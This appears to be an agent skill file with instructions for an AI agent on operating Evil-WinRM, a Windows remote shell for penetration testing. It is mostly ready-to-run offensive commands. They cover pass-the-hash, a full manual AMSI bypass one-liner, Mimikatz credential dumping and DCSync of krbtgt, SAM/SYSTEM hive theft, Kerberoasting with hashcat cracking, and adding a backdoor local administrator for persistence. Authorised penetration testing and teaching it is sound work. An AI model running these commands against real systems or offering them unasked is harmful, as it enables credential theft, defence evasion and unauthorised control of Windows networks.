---
name: evil-winrm
description: >
  Build, extend, and operate Evil-WinRM — a WinRM shell designed for pentesting
  Windows environments. Use when the user asks about Evil-WinRM, Windows remote
  management shells, pass-the-hash over WinRM, uploading/downloading files to Windows
  targets, loading PowerShell scripts or C# DLLs in memory, bypassing AMSI, or
  post-exploitation workflows on Windows hosts. Covers installation, basic and advanced
  connection options, pass-the-hash, SSL mode, file transfer, script/DLL loading,
  AMSI bypass, logging, Docker usage, proxychains, and full post-exploitation workflow.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/Hackplayers/evil-winrm
---

# evil-winrm Agent Skill

## When to Use This Skill

Use this skill when:
- The user has valid Windows credentials (or NTLM hash) and WinRM is enabled (port 5985/5986)
- Post-exploitation on Windows targets requires a PowerShell shell with file transfer capabilities
- The user needs to load PowerShell scripts or C# DLLs into memory without touching disk
- Pass-the-hash attacks against WinRM are needed
- The user asks about bypassing AMSI within a WinRM session
- Proxychains or pivot-based WinRM access is required

## What Evil-WinRM Does

Evil-WinRM is a Ruby-based WinRM shell purpose-built for penetration testing. It provides a
fully interactive PowerShell session over WinRM (Windows Remote Management) with built-in
features for offensive work: pass-the-hash, SSL/TLS support, file upload/download, in-memory
loading of PowerShell scripts and compiled C# DLLs, AMSI bypass, and session logging. It is
the standard tool for post-exploitation when WinRM is exposed (common in Active Directory
environments where it is enabled by default on domain controllers and management servers).

## Installation

```bash
# RubyGems (recommended)
gem install evil-winrm

# From source
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
gem install bundler
bundle install
ruby evil-winrm.rb --help

# Kali Linux
sudo apt install evil-winrm -y

# Docker
docker pull oscarakaelvis/evil-winrm
docker run --rm -ti --network host oscarakaelvis/evil-winrm \
  -i 10.10.10.100 -u administrator -p 'Password123!'
```

**Ruby version requirement:** Ruby >= 2.3 required; Ruby 3.x supported.

## Core Concepts

### WinRM Prerequisites on Target

```powershell
# WinRM must be enabled on target (port 5985 HTTP or 5986 HTTPS)
# Check from attacker: nmap -p 5985,5986 10.10.10.100

# On target (if you have console access), enable WinRM:
winrm quickconfig -y
Enable-PSRemoting -Force
# Allow from specific IP (if firewall restricts):
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.14.5"
```

### Required Privileges

WinRM access requires the user to be in one of:
- Local Administrators group
- Remote Management Users group
- `Builtin\Remote Management Users` (Windows 2012+)

Domain accounts with Domain Admin or local admin rights on the target work directly.

## CLI Reference

### Basic Connection

```bash
# Username + password (HTTP, port 5985)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!'

# Domain account
evil-winrm -i 10.10.10.100 -u DOMAIN\\jsmith -p 'Summer2024!'
evil-winrm -i 10.10.10.100 -u jsmith -p 'Summer2024!' -d CONTOSO.LOCAL

# Specify port (non-default)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -P 5986

# IPv6
evil-winrm -i fe80::1%eth0 -u administrator -p 'Password123!'
```

### Pass-the-Hash

```bash
# NTLM hash (no password required)
evil-winrm -i 10.10.10.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Only the NT hash is needed (LM portion can be zeros or the real value)
evil-winrm -i 10.10.10.100 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Obtain hash via secretsdump, mimikatz, etc.
# secretsdump: administrator:500:aad3b435...:<NT_HASH>:::
# Pass the NT portion (right of last colon)
```

### SSL Mode (Port 5986)

```bash
# Basic SSL (ignore cert validation)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -S

# Provide client certificate and key (mutual TLS)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -S \
  -c /path/to/client_cert.pem -k /path/to/client_key.pem

# With custom CA certificate
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -S \
  -C /path/to/ca_cert.pem
```

### PowerShell Script Loading

```bash
# Load scripts from local directory into memory at session start
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' \
  -s /opt/powershell-scripts/

# Scripts are loaded via Import-Module in-memory — never touch disk
# Inside session, call functions directly:
*Evil-WinRM* PS> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM* PS> Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
*Evil-WinRM* PS> PowerView\Get-DomainUser
```

Common script directories:
- `/usr/share/powershell-empire/empire/server/data/module_source/`
- `/opt/nishang/`
- `/usr/share/windows-resources/powersploit/`

### C# DLL Loading

```bash
# Load compiled .NET assemblies into session (in-memory, bypasses AV on-write)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' \
  -e /opt/dotnet-dlls/

# Inside session, use menu to load:
*Evil-WinRM* PS> menu
# Lists available executables from -e path

*Evil-WinRM* PS> Bypass-4MSI   # Built-in AMSI bypass
*Evil-WinRM* PS> SharpHound.exe -c All --zipfilename loot.zip
*Evil-WinRM* PS> Rubeus.exe kerberoast /outfile:hashes.txt
*Evil-WinRM* PS> Seatbelt.exe -group=all
```

### File Upload and Download

```bash
# Inside the Evil-WinRM session:

# Upload file to current directory on target
*Evil-WinRM* PS> upload /local/path/file.exe

# Upload to specific path
*Evil-WinRM* PS> upload /tmp/payload.exe C:\Windows\Temp\update.exe

# Download from target
*Evil-WinRM* PS> download C:\Windows\Temp\loot.zip /local/output/loot.zip
*Evil-WinRM* PS> download C:\Users\Administrator\Documents\passwords.xlsx

# Download SAM hive (after dumping)
*Evil-WinRM* PS> reg save HKLM\SAM C:\Temp\sam.bak
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Temp\system.bak
*Evil-WinRM* PS> download C:\Temp\sam.bak
*Evil-WinRM* PS> download C:\Temp\system.bak
```

### Session Logging

```bash
# Log all input/output to file
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' \
  -l /tmp/winrm-session.log

# Logs timestamped commands and output for evidence/reporting
```

### Colorize and Output Options

```bash
# Disable color (for logging to file)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' --no-colors

# Disable SSL certificate validation warnings
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -S -r evil-winrm
```

## AMSI Bypass

Evil-WinRM includes a built-in AMSI bypass:

```powershell
# Inside session
*Evil-WinRM* PS> Bypass-4MSI

# Manual AMSI bypass (if built-in fails due to newer patches)
*Evil-WinRM* PS> $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

After AMSI bypass, load scripts that would otherwise be caught:

```powershell
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

## Proxychains Support

```bash
# Route Evil-WinRM through SOCKS5 proxy (e.g., after SSH pivot)
proxychains evil-winrm -i 10.10.20.5 -u administrator -p 'Password123!'

# With Metasploit SOCKS5 proxy module running on 127.0.0.1:1080:
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains4 evil-winrm -i 172.16.0.50 -u jdoe -H <NT_HASH>
```

## Common Post-Exploitation Workflows

### Initial Enumeration

```powershell
# Once in Evil-WinRM shell:
whoami /all
hostname; ipconfig /all
net localgroup administrators
net user
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description | Format-Table
Get-ADGroupMember "Domain Admins"
(Get-ADDomain).PDCEmulator
```

### Upload and Run SharpHound (BloodHound collector)

```bash
# From attacker:
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -e /opt/SharpHound/

# In session:
*Evil-WinRM* PS> menu        # Confirm SharpHound.exe is listed
*Evil-WinRM* PS> SharpHound.exe -c All --zipfilename bloodhound_data.zip
*Evil-WinRM* PS> download C:\Users\Administrator\bloodhound_data_20260101.zip
```

### Dump Credentials with Mimikatz

```bash
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -s /opt/powersploit/

# In session:
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
*Evil-WinRM* PS> Invoke-Mimikatz -Command "lsadump::sam"
*Evil-WinRM* PS> Invoke-Mimikatz -Command "lsadump::dcsync /user:krbtgt"
```

### SAM Dump via Registry

```powershell
*Evil-WinRM* PS> reg save HKLM\SAM C:\Temp\sam
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Temp\system
*Evil-WinRM* PS> reg save HKLM\SECURITY C:\Temp\security
*Evil-WinRM* PS> download C:\Temp\sam
*Evil-WinRM* PS> download C:\Temp\system
*Evil-WinRM* PS> download C:\Temp\security

# On attacker — extract hashes
secretsdump.py -sam sam -system system -security security LOCAL
```

### Kerberoasting via Rubeus

```bash
evil-winrm -i 10.10.10.100 -u jdoe -p 'Password1' -e /opt/Rubeus/

*Evil-WinRM* PS> Rubeus.exe kerberoast /outfile:C:\Temp\kerb_hashes.txt
*Evil-WinRM* PS> download C:\Temp\kerb_hashes.txt

# Crack with hashcat:
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Lateral Movement Setup

```powershell
# Add new local admin for persistence
*Evil-WinRM* PS> net user hacker P@ssw0rd123 /add
*Evil-WinRM* PS> net localgroup administrators hacker /add

# Enable WinRM on a host it was disabled on (if domain admin)
*Evil-WinRM* PS> Invoke-Command -ComputerName dc01 -ScriptBlock { Enable-PSRemoting -Force }
```

## Integration with Other Tools

| Tool | Use Case |
|------|----------|
| BloodHound | Upload/run SharpHound, download ZIP for analysis |
| Mimikatz / Invoke-Mimikatz | Credential dumping after AMSI bypass |
| Rubeus | Kerberos attacks (Kerberoast, AS-REP roast, pass-the-ticket) |
| CrackMapExec | Identify WinRM-enabled hosts before connecting with Evil-WinRM |
| secretsdump.py (Impacket) | Process SAM/SYSTEM dumps downloaded via Evil-WinRM |
| Proxychains + Chisel | Pivot through compromised hosts to reach internal WinRM |

## Troubleshooting

**Connection refused / WinRM not responding:**
```bash
# Verify WinRM is listening
nmap -p 5985,5986 10.10.10.100 -sV
# If filtered, try through pivot with proxychains
```

**Authentication failure with valid creds:**
```bash
# Try specifying domain explicitly
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!' -d CONTOSO
# Ensure user is in Remote Management Users or Administrators
```

**Pass-the-hash not working:**
- Verify the hash format: `LMHASH:NTHASH` or just NT hash
- Check if LocalAccountTokenFilterPolicy is disabled (common on non-domain hosts)
- On workgroups: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`

**DLL / script not loading:**
```bash
# Ensure the -e path contains .exe or .dll files (not subdirectories)
# Check if AMSI is blocking: run Bypass-4MSI first
# Verify .NET version: [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
```

**SSL certificate errors:**
```bash
# Always use -S flag when connecting to port 5986
evil-winrm -i 10.10.10.100 -u admin -p 'Pass' -S -P 5986
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [How to Attack-Test Your Own Domain Controllers Before an Adversary Does](https://redhound.us/attack-test-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
